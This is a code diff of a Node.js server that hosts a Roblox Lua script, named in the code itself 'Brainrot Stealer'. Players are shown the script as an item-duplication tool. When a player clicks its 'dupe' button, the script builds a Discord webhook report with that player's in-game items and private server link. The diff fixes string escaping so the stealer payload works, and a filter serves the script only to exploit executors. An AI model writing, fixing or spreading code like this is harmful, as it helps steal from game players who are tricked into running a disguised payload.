@@ -1,4 +1,4 @@
-// server.js - FINAL FIXED VERSION
+// server.js - COMPLETELY FIXED VERSION
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -73,7 +73,7 @@ app.get("/", (req, res) => {
   res.send("Brainrot Stealer Server");
 });
 
-// /raw → PROPERLY ESCAPED LUA SCRIPT
+// /raw → FIXED LUA SCRIPT
 app.get("/raw", blockNonExecutor, (req, res) => {
   const webhookId = req.query.id;
 
@@ -81,9 +81,7 @@ app.get("/raw", blockNonExecutor, (req, res) => {
     return res.status(400).send("-- MISSING WEBHOOK ID --");
   }
 
-  // Use string concatenation to avoid template literal issues
-  const luaScript = 
-`-- Brainrot Stealer - Simple Version
+  const luaScript = `-- Brainrot Stealer - Simple Version
 print("Loading Brainrot Stealer...")
 
 local Players = game:GetService("Players")
@@ -447,10 +445,7 @@ dupeButton.MouseButton1Click:Connect(function()
         hitStatus = "this dosent look like a legit hit"
     end
     
-    -- Create embed (FIXED - using proper string concatenation)
-    local brainrotsField = "```" + brainrotsText + "```"
-    local serverField = "```" + serverLink + "```"
-    
+    -- Create embed (FIXED - using proper Lua string concatenation)
     local embed = {
         title = "# LOGGED PLAYER",
         description = "a player just ran your script!",
@@ -463,12 +458,12 @@ dupeButton.MouseButton1Click:Connect(function()
             },
             {
                 name = "Brainrots", 
-                value = brainrotsField,
+                value = "\\`\\`\\`" .. brainrotsText .. "\\`\\`\\`",
                 inline = false
             },
             {
                 name = "Private Server",
-                value = serverField,
+                value = "\\`\\`\\`" .. serverLink .. "\\`\\`\\`",
                 inline = false
             },
             {
